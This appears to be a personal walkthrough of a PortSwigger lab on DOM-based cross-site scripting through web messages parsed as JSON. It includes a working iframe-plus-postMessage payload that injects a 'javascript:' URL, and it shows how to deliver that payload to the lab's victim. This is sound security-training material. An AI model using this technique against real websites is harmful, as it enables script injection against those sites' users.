
# #PortSwigger 


![[Pasted image 20260524222304.png]]


## Lab Description

> This lab uses web messaging and parses the message as JSON.  
> **Objective:** Construct an HTML page on the exploit server that exploits this vulnerability and calls the `print()` function.

---

## Step 1: Understanding the Vulnerability

This lab introduces a **structured message** pattern where the target page expects JSON data instead of plain strings.

**The vulnerability chain:**
1. Page has an event listener waiting for web messages
2. Listener expects a **JSON string** that gets parsed with `JSON.parse()`
3. Parsed JSON must have a `type` property
4. A `switch` statement handles different `type` values
5. The `load-channel` case takes a `url` property and sets it as an `iframe.src`
6. **No origin validation** and **no URL sanitization** → JavaScript URL injection    





## Step 2: Reconnaissance

1. Open the lab homepage
2. Open **Browser Developer Tools** → **View Page Source** or **Sources** tab
3. Look for the vulnerable event listener:

![[Pasted image 20260524231207.png]]

**Key observations:**
-  No origin validation (`event.origin` is not checked)
-  Message is parsed as JSON without validation
-  `data.url` is directly assigned to `iframe.src`
-  No URL scheme validation → `javascript:` URLs work






## Step 3: Understanding the Target Structure

The page has an `iframe` element (likely for a video player). The `load-channel` message type changes the `src` of this iframe.

**Expected message structure:**
```
{
    "type": "load-channel",
    "url": "https://some-video-url.com/video.mp4"
}
```

**What we will inject:**
```
{
    "type": "load-channel",
    "url": "javascript:print()"
}
```






## Step 4: Building the Exploit Payload

The payload must be:
1. A **valid JSON string**
2. Sent via `postMessage()`
3. Parsable by `JSON.parse()`

### Step 4.1: Construct the JSON Object

```
{"type":"load-channel","url":"javascript:print()"}
```

### Step 4.2: Stringify for postMessage

When sending via `postMessage()`, the message must be a string. The JSON needs to be **escaped** properly inside JavaScript.

**Unescaped (won't work):**
```
postMessage('{"type":"load-channel","url":"javascript:print()"}', '*')
```

**Escaped (correct):**
```
postMessage('{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}','*')
```






## Step 5: Building the Exploit Page

1. Go to the **Exploit server** (provided in the lab)
2. In the **Body** section, paste the following HTML:

```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" 
        onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
</iframe>
```

3. Replace `YOUR-LAB-ID` with your actual lab ID

![[Pasted image 20260524234243.png]]






## Step 6: Understanding the Exploit

### Code Breakdown:

```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" 
```

Loads the vulnerable target page inside the iframe.
```
onload='this.contentWindow.postMessage(...)'
```

When the iframe loads, send a web message to the target window.
```
"{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}"
```

The escaped JSON string. After `JSON.parse()` on the target, it becomes:
```
{
    "type": "load-channel",
    "url": "javascript:print()"
}
```

```
"*"
```

- Target origin wildcard — send to any origin (vulnerable, but bypasses no origin check).






## Step 7: Testing the Exploit

1. Click **View exploit** (simulates visiting your malicious page)
2. Observe that the `print()` dialog appears

![[Pasted image 20260524234233.png]]

**Success indicator:** Your browser's print dialog pops up. 

![[Pasted image 20260524234140.png]]






## Step 8: Delivering to the Victim

1. Click **Store** to save the exploit
2. Click **Deliver exploit to victim**
3. The lab solves when the victim's browser executes the payload

![[Pasted image 20260524234339.png]]





## Step 9: Lab Solved

Success message displayed:

![[Pasted image 20260524234402.png]]

---

## Key Takeaways

> **Structured data via web messages is still dangerous if not properly validated before being used in DOM sinks.**


---
